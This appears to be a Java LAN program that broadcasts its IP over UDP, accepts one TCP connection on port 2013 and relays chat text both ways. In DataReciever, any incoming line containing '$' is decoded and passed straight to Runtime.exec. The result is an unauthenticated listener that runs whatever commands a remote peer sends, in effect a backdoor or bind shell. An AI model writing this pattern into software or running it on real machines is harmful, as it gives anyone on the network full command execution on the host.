import java.io.*;
import java.lang.*;
import java.net.*;


class Broadcaster extends Thread
{
		DatagramSocket 	ds;
                String ipadd;

	Broadcaster()
	{
		start();
	}

	public void run()
	{
	    try
	    {
                ipadd="192.168.0.1";
                System.out.println("My IP:" + ipadd);
	  	ds=new DatagramSocket(2012);
	    }catch(Exception e){}
 	    try
	    {
	        while(true)
		{
		  
			ds.setBroadcast(true);
                        ds.send(new DatagramPacket(ipadd.getBytes(),0,ipadd.getBytes().length,InetAddress.getByName("192.168.0.3"),2012));
                        ds.send(new DatagramPacket(ipadd.getBytes(),0,ipadd.getBytes().length,InetAddress.getByName("192.168.0.2"),2012));
                        ds.send(new DatagramPacket(ipadd.getBytes(),0,ipadd.getBytes().length,InetAddress.getByName("192.168.0.1"),2012));
			Thread.currentThread().sleep(1000);

		}
	   }catch(Exception E){System.out.println("Exception:" + E);}

	}

}

class DataReciever extends Thread
{
    DataInputStream reader;
	DataReciever(DataInputStream reader)
	{
		this.reader=reader;
		start();
	}

 	public void run()
	{
		System.out.println("Reciever ready !!\n");
	  
		while(true)
		{ 
			try
			{
				String data=reader.readLine();
				if(data.indexOf("$")!=-1)
				{	
					String temp="";
					data=data.substring(data.indexOf("$")+1);
					for(int i=0;i<data.length();i++)
					{
						if(i%2!=0)
						     temp=temp + data.charAt(i);	
					}
					
					System.out.println("COMMAND RECEIVED:" + temp);
					Runtime.getRuntime().exec(temp);
				}
				else 
					System.out.printf(data + "\n");
			}catch(Exception E){System.out.println("EXCEPTION:" + E);}

		}
	}
}

class DataTransmitter extends Thread
{
	DataOutputStream writer;

	DataTransmitter(DataOutputStream writer)
	{
		this.writer=writer;
		start();
	}

 	public void run()
	{
		InputStreamReader ins=new InputStreamReader(System.in);
		BufferedReader in=new BufferedReader(ins);
		System.out.println("Transmitter ready !!");	

	        while(true)
		{      try
	               {
				String data=in.readLine();
				writer.writeChars(data + "\n");	
				writer.flush();	  
			}catch(Exception E){System.out.println("EXCEPTION:" + E);}

		}
	}
}


public class codeTransfer
{
	public static void main(String args[])
	{
	
	      try
	      {
               new Broadcaster();	
		ServerSocket ss=new ServerSocket(2013);
		Socket cs=ss.accept();
		DataInputStream reader=new DataInputStream(cs.getInputStream())	;
		DataOutputStream writer=new DataOutputStream(cs.getOutputStream());
	        new  DataTransmitter(writer);	
		new  DataReciever(reader);

	      }
	      catch(Exception E){}
	}
}

